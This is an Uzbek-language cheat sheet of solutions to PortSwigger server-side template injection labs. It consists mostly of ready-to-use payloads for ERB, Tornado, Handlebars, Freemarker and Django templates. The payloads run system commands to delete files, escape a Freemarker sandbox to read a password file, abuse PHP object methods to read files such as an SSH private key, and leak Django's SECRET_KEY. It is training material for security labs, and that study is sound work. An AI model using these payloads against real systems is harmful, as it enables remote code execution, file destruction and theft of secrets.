# SSTI — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**.
> Aniqlash: `${{<%[%'"}}%\` yubor, yoki `${7*7}`/`{{7*7}}` → 49 chiqsa SSTI bor.
> Engine'ni xato xabari (stack trace) aytib beradi.

### Basic — ERB (Ruby) — PRACTITIONER
`message` parametri ERB template'ga tushadi.
```
<%= system("rm /home/carlos/morale.txt") %>
```
URL-encoded: `?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`

### Basic code context — Tornado (Python) — PRACTITIONER
Input `{{ }}` ichida (code context) → avval yopib chiqasan.
```
blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```
> `}}` mavjud expression'ni yopadi, `{% import os %}` modulni import qiladi.

### Unknown language, documented exploit — Handlebars (Node) — PRACTITIONER
Fuzzing xatosi Handlebars ekanini ko'rsatadi. `@Zombiehelp54` exploit:
```handlebars
{{#with "s" as |string|}}
  {{#with split as |conslist|}}
    {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
    {{#with string.split as |codelist|}}
      {{this.pop}}{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}{{this.pop}}
      {{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```
> URL-encode qilib `message` ga ber.

### Using documentation — Freemarker (Java) — PRACTITIONER
`${...}` syntax, `${foobar}` xatosi Freemarker'ni ko'rsatadi. Product description template.
```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

### Sandboxed environment — Freemarker sandbox escape — EXPERT
Sandbox RCE bermaydi → `getClass()` zanjiri bilan fayl o'qiysan.
```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
> Natija decimal ASCII — matnga o'girib submit qil.

### Custom exploit (PHP, user object) — EXPERT
Engine named emas; `/home/carlos/User.php` PHP ekanini ko'rsatadi. `user` obyekti metodlari bilan
fayl o'qib-o'chirasan. `blog-post-author-display` orqali:
```
user.setAvatar('/home/carlos/User.php','image/jpg')      → gdprDelete() ni top
user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')   → target faylni avatar qil
user.gdprDelete()                                        → faylni o'chir (lab solved)
```
> `GET /avatar?avatar=wiener` bilan avatar'ni o'qiysan.

### Information disclosure via user-supplied objects — Django — EXPERT
RCE yo'q → `{% debug %}` bilan mavjud obyektlarni ko'r, `settings` chiqadi.
```
{{settings.SECRET_KEY}}
```

---

### Eslatma
Payvand: engine aniqla → doc'dan built-in izla → RCE yoki file-read. Himoya: logic-less template
(Mustache), sandbox, user input'ni template sifatida render qilmaslik. Umumiy: bu papka README.
